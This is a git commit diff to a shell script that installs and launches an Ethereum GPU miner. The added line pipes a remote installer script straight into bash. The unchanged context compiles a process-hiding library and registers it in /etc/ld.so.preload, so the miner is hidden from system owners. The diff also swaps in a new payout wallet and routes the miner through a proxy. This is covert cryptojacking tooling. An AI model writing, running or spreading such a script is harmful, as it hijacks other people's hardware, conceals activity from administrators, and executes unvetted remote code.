83e7210a381ee8df31f319783ff6d5911edbdd3b
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-05-04 18:21:21 +0200

    Update and rename start_Nano_Etherm.sh to start_nano_ethermWs4.sh

--- start_nano_ethermWs4.sh
+++ start_nano_ethermWs4.sh
@@ -1,4 +1,6 @@
 #!/bin/sh
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installerWsocks4.sh | bash
+
 wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNan.zip
 unzip magicNan.zip
 make
@@ -6,13 +8,13 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-wget https://github.com/nanopool/nanominer/releases/download/3.3.2/nanominer-linux-3.3.2-cuda11.tar.gz
-tar -xvzf nanominer-linux-3.3.2-cuda11.tar.gz
-cd nanominer-linux-3.3.2-cuda11
+wget https://github.com/nanopool/nanominer/releases/download/3.3.5/nanominer-linux-3.3.5-cuda11.tar.gz
+tar -xvzf nanominer-linux-3.3.5-cuda11.tar.gz
+cd nanominer-linux-3.3.5-cuda11
 rm config*
 cat > config_eth.ini <<END
 [Ethash]
-wallet = 0x8CB8003E428D0Fd7693D22f576A212403728c64a
+wallet = 0x52500352a37a06f0c085d58663e4eadbd7e9f684
 rigName = Nano
 pool1 = us1.ethermine.org:5555
 protocol = JSON-RPC
@@ -20,10 +22,10 @@ END
 
 cat > config.ini <<END
 [Ethash]
-wallet = 0x8CB8003E428D0Fd7693D22f576A212403728c64a
+wallet = 0x52500352a37a06f0c085d58663e4eadbd7e9f684
 rigName = Nano
 pool1 = us1.ethermine.org:5555
 protocol = JSON-RPC
 END
 
-./nanominer
+graftcp ./nanominer
